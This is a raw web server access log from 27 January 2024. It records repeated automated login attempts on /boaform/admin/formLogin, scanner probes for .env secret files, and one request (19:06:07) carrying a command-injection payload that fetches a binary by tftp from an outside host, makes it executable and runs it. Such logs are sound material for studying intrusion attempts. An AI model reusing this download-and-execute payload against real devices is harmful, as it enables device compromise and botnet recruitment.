94.156.66.21 - - [27/Jan/2024:14:24:08 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:14:24:08 +0000] "" 400 0 "-" "-"
96.127.160.234 - - [27/Jan/2024:14:27:08 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
96.127.160.234 - - [27/Jan/2024:14:27:08 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:14:29:35 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:14:29:36 +0000] "" 400 0 "-" "-"
128.199.73.251 - - [27/Jan/2024:14:32:54 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
128.199.73.251 - - [27/Jan/2024:14:32:54 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:14:41:42 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:14:41:42 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:14:41:59 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:14:41:59 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:14:49:08 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:14:49:08 +0000] "" 400 0 "-" "-"
43.130.62.164 - - [27/Jan/2024:15:04:59 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
198.98.51.91 - - [27/Jan/2024:15:05:52 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
198.98.51.91 - - [27/Jan/2024:15:05:53 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:15:06:27 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:15:06:27 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:15:07:54 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:15:07:54 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:15:10:41 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:15:10:42 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:15:12:31 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:15:12:31 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:15:23:29 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:15:23:29 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:15:26:21 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:15:26:21 +0000] "" 400 0 "-" "-"
87.98.153.11 - - [27/Jan/2024:15:26:50 +0000] "GET / HTTP/1.0" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
192.30.52.11 - - [27/Jan/2024:15:31:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
94.156.66.229 - - [27/Jan/2024:15:32:24 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:15:32:24 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:15:38:04 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:15:38:04 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:15:42:51 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:15:42:51 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:15:48:05 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:15:48:06 +0000] "" 400 0 "-" "-"
198.199.93.93 - - [27/Jan/2024:15:48:30 +0000] "MGLNDD_180.233.121.154_80" 400 154 "-" "-"
94.156.66.229 - - [27/Jan/2024:15:52:08 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:15:52:08 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:15:54:11 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:15:54:11 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:15:58:46 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:15:58:46 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:16:05:37 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:16:05:38 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:16:11:33 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:16:11:33 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:16:14:03 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:16:14:03 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:17:10:01 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:17:10:01 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:17:19:30 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:17:19:30 +0000] "" 400 0 "-" "-"
106.75.72.144 - - [27/Jan/2024:17:20:41 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
94.156.66.21 - - [27/Jan/2024:17:21:18 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:17:21:18 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:17:22:48 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:17:22:49 +0000] "" 400 0 "-" "-"
128.199.73.251 - - [27/Jan/2024:17:23:06 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
128.199.73.251 - - [27/Jan/2024:17:23:06 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:17:31:18 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:17:31:18 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:17:32:38 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:17:32:38 +0000] "" 400 0 "-" "-"
138.199.60.176 - - [27/Jan/2024:17:38:33 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
138.199.60.176 - - [27/Jan/2024:17:38:33 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:17:42:36 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:17:42:36 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:17:45:22 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:17:45:22 +0000] "" 400 0 "-" "-"
167.248.133.33 - - [27/Jan/2024:17:46:38 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
167.248.133.33 - - [27/Jan/2024:17:46:42 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.33 - - [27/Jan/2024:17:46:43 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
94.156.66.229 - - [27/Jan/2024:17:52:41 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:17:52:41 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:18:00:33 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:18:00:33 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:18:02:45 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:18:02:45 +0000] "" 400 0 "-" "-"
170.106.82.193 - - [27/Jan/2024:18:03:04 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
94.156.66.229 - - [27/Jan/2024:18:03:11 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:18:03:11 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:18:09:22 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:18:09:23 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:18:14:41 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:18:14:41 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:18:21:24 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:18:21:24 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:18:27:48 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:18:27:48 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:18:31:03 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:18:31:03 +0000] "" 400 0 "-" "-"
78.153.140.177 - - [27/Jan/2024:18:35:40 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [27/Jan/2024:18:35:41 +0000] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03+\x7F\x9C\xD1\xE4\xCA\x99\x857\xAC\x99w\xA2\x04yL\x9C\x83\xC0o\xD4J\x00e\xE7w\x19\xE7\xCBq\x1Fo \xE3N\xA4\xB1J\xDB\x9A@\xAD\xC8n'5\xEA\x976\x99h\xE8\xC5" 400 154 "-" "-"
185.241.208.97 - - [27/Jan/2024:18:37:32 +0000] "GET /installer.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0"
179.43.161.130 - - [27/Jan/2024:18:39:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.229 - - [27/Jan/2024:18:41:13 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:18:41:13 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:18:41:44 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:18:41:44 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:18:43:15 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:18:43:16 +0000] "" 400 0 "-" "-"
91.217.80.200 - - [27/Jan/2024:18:48:30 +0000] "HEAD / HTTP/1.0" 301 0 "-" "Opera/9.80 (Windows NT 5.1; U; Edition Next; ru) Presto/2.10.238 Version/12.00"
91.217.80.200 - - [27/Jan/2024:18:48:30 +0000] "HEAD / HTTP/1.1" 301 0 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)"
5.180.136.35 - - [27/Jan/2024:18:49:24 +0000] "HEAD / HTTP/1.0" 301 0 "-" "Opera/9.80 (Series 60; Opera Mini/6.1.25380/26.1424; U; ru) Presto/2.8.119 Version/10.54"
5.180.136.35 - - [27/Jan/2024:18:49:25 +0000] "HEAD / HTTP/1.1" 301 0 "-" "Opera/8.01 (Windows NT 5.1)"
94.156.66.229 - - [27/Jan/2024:18:51:25 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:18:51:25 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:18:57:24 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:18:57:24 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:19:02:42 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:19:02:42 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:19:05:24 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:19:05:24 +0000] "" 400 0 "-" "-"
45.128.232.235 - admin [27/Jan/2024:19:06:07 +0000] "GET /goform/SystemCommand?command=cd+tmp%3Brm+-rf+atlas.mpsl%3Btftp+-g+-l+atlas.mpsl+-r+atlas.mpsl+45.128.232.235%3Bchmod+777+*%3B.%2Fatlas.mpsl+0day HTTP/1.1" 301 166 "http://216.155.93.7:8081/setting.htm" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
94.156.66.21 - - [27/Jan/2024:19:16:58 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:19:16:58 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:19:19:26 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:19:19:26 +0000] "" 400 0 "-" "-"
3.8.172.91 - - [27/Jan/2024:19:25:30 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x033\x958\xD5\xD5\xB6\xCFy\xD8\xF9\x8B8V\xFA\xD6\xDCa\xE3\x86ldc\x15\x8C\x15~\xE8\xFFS\xAF\xB9h\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
45.128.232.235 - - [27/Jan/2024:19:28:22 +0000] "GET / HTTP/1.0" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
3.8.172.91 - - [27/Jan/2024:19:28:53 +0000] "\x16\x03\x01\x00\xB1\x01\x00\x00\xAD\x03\x03\x82\x84\xD4\x0C%\xAAe\xDCan\xFC2\xED\xED\x96s`\xF0\xCB\xAB\x22\xDFwp\xFF\xEAK%X\xD3\x85\xEE\x00\x00P\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
94.156.66.229 - - [27/Jan/2024:19:29:34 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:19:29:34 +0000] "" 400 0 "-" "-"
3.8.172.91 - - [27/Jan/2024:19:30:05 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
94.156.66.21 - - [27/Jan/2024:19:31:29 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:19:31:29 +0000] "" 400 0 "-" "-"
3.8.172.91 - - [27/Jan/2024:19:32:56 +0000] "\x16\x03\x01\x00\xB1\x01\x00\x00\xAD\x03\x03\xDF\xED\xC0u!\x13\xAE\x13$\x82\xBF\x17\x1E\x03\x06\xDDwFZ\x80g\xA61\xB4\xF6\xDCy\xE9\xC7\xAC}q\x00\x00P\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
94.156.66.21 - - [27/Jan/2024:19:34:07 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:19:34:07 +0000] "" 400 0 "-" "-"
3.8.172.91 - - [27/Jan/2024:19:34:08 +0000] "GET /manage/account/login HTTP/1.1" 301 166 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
3.8.172.91 - - [27/Jan/2024:19:38:21 +0000] "\x16\x03\x01\x00\xB1\x01\x00\x00\xAD\x03\x03r\x86\xEBS\xA2,\xD7'\xE1\x86\xE1:0\xD4p/\xBA\xB0\xBA}S\xA2\x9A\xA8\x92\x10O@\xA8\x11c\x9F\x00\x00P\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
3.8.172.91 - - [27/Jan/2024:19:39:34 +0000] "GET /admin/index.html HTTP/1.1" 301 166 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
94.156.66.229 - - [27/Jan/2024:19:42:17 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:19:42:17 +0000] "" 400 0 "-" "-"
5.190.144.109 - - [27/Jan/2024:19:42:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
3.8.172.91 - - [27/Jan/2024:19:43:12 +0000] "\x16\x03\x01\x00\xB1\x01\x00\x00\xAD\x03\x03\xFE\x9Dz\x97\xE9q\x13\x8E\xD0KV!\xF17R8\xA1\xAB=L(:\x08\x22\x85M\xA2\x15\x5C\x8Dg\x06\x00\x00P\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
3.8.172.91 - - [27/Jan/2024:19:44:24 +0000] "GET /index.html HTTP/1.1" 301 166 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
94.156.66.21 - - [27/Jan/2024:19:44:51 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:19:44:51 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:19:47:42 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:19:47:42 +0000] "" 400 0 "-" "-"
3.8.172.91 - - [27/Jan/2024:19:48:46 +0000] "\x16\x03\x01\x00\xB1\x01\x00\x00\xAD\x03\x03\xE8\xC4w\xB08\x95\x8Et\x10\x19\x17\xA2\x89\x9BD\x17bi\xA3(m[\xFA\xD3\xADA5a\x0E?\xE2\x02\x00\x00P\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
3.8.172.91 - - [27/Jan/2024:19:49:56 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 301 166 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
20.70.20.240 - - [27/Jan/2024:19:53:12 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:12 +0000] "POST /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:12 +0000] "GET /local/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:13 +0000] "POST /local/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:13 +0000] "GET /app/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
